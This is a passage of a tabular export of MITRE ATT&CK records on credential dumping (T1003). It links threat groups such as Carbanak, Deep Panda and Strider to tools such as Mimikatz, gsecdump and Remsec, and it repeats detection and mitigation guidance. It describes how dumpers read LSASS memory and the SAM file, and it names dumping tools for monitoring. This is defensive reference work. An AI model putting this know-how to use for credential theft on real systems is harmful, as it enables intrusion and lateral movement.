monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['PittyTiger'],['PittyTiger'],['G0011'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
22,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0008|gsecdump]] can dump Windows password hashes and LSA secrets.[[CiteRef::TrueSec Gsecdump]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: gsecdump,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
23,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
24,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0080|Mivast]] has the capability to gather NTLM password information.[[CiteRef::Symantec Backdoor.Mivast]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mivast,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
25,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0125|Remsec]] can dump the SAM database.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]] It also can register itself as a Windows Local System Authority password filter on domain controllers, which allows it to harvest passwords when users change passwords.[[CiteRef::Kaspersky ProjectSauron Full Report]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
26,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Group/G0041|Strider]] has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to dump credentials any time a domain, local user, or administrator logs in or changes a password.[[CiteRef::Kaspersky ProjectSauron Full Report]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
27,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0130|Unknown Logger]] is capable of stealing usernames and passwords from browsers on the victim machine.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Unknown Logger,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
28,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0001|Axiom]] has been known to dump credentials.[[CiteRef::Axiom]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
29,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0056|Net Crawler]] uses credential dumpers such as [[Software/S0002|Mimikatz]] and [[Software/S0005|Windows Credential Editor]] to extract cached credentials from Windows systems.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Net Crawler, NetC",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
30,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
31,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0003|Cleaver]] has been known to dump credentials.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using 